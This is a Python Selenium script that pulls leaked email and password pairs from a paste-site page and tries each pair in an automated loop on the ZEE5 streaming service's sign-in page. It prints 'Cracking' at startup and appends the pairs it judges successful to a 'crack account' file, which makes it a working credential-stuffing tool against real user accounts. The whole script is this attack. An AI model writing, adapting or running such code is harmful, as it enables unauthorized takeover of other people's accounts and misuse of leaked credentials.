from selenium import webdriver
import os, time

os.system('cls' if os.name == 'nt' else 'clear')
start = time.time()
print('Cracking................')
browser = webdriver.Firefox(executable_path='F:\py practice\web scrapping\geckodriver-v0.26.0-win64\geckodriver.exe')

browser.get('https://pastr.io/view/56ILiEPCRYJ')
elem = browser.find_element_by_css_selector('.pre-code')
#print(elem.text)]
c=0
#for i in elem.text.split(':'):
 #   if 'Proxy' in i:
 #       c+=1
    
#print('count= ',c)
r = ','.join(elem.text.split('\n')).split(',')
i = 1
#acc = {}
ac=[]
while i < len(r)+1:
    a = r[i-1].split(':')
    ac.append(a[0].strip())
    ac.append(a[1].strip())
    #acc[a[0].strip()] = a[1].strip()
    i += 7
print(ac,len(ac)/2)
#time.sleep(10)
browser.get('https://www.zee5.com/signin')


file_count = open('F:\py practice\web scrapping\crack acc count.txt','r')
i=int(file_count.read())
print(i)
file_count.close()
Total_account = 0
while i<len(ac)/2:
    file_count = open('F:\py practice\web scrapping\crack acc count.txt', 'w')
    file_count.write(str(i))
    file_count.close()

    try:
        elem_email = browser.find_element_by_css_selector('#textField')
        elem_email.send_keys(ac[i])
        #time.sleep(10)
        elem_pass = browser.find_element_by_css_selector('div.floatingLabelInput:nth-child(2) > input:nth-child(1)')

        elem_click = browser.find_element_by_css_selector('.gradientBtnContainer > div:nth-child(1) > button:nth-child(1) > span:nth-child(1)')
        elem_pass.send_keys(ac[i+1])
        #time.sleep(3)
        elem_click.click()
        time.sleep(3)
        #elem_email.clear()
        #elem_pass.clear()
        browser.refresh()
    except:
        Total_account+=1
        file = open('F:\py practice\web scrapping\crack account.txt', 'a')
        file.write('\n'+ac[i-2]+' '+ac[i-1])
        file.close()
        browser.quit()
        browser = webdriver.Firefox(
            executable_path='F:\py practice\web scrapping\geckodriver-v0.26.0-win64\geckodriver.exe')
        browser.get('https://www.zee5.com/signin')
        elem_email = browser.find_element_by_css_selector('#textField')
        elem_email.send_keys(ac[i])
        #time.sleep(10)
        elem_pass = browser.find_element_by_css_selector(
            'div.floatingLabelInput:nth-child(2) > input:nth-child(1)')

        elem_click = browser.find_element_by_css_selector(
            '.gradientBtnContainer > div:nth-child(1) > button:nth-child(1) > span:nth-child(1)')
        elem_pass.send_keys(ac[i+1])
        #time.sleep(3)
        elem_click.click()
        time.sleep(3)
        #elem_email.clear()
        #elem_pass.clear()
        browser.refresh()
        
    print('Time = ', time.time()-start)

    
    i+=2
file = open('F:\py practice\web scrapping\crack account.txt', 'a')
file.write('\n'+ac[i-2]+' '+ac[i-1])
file.close()

print('Time = ',time.time()-start)
print('Total Account = ',Total_account)
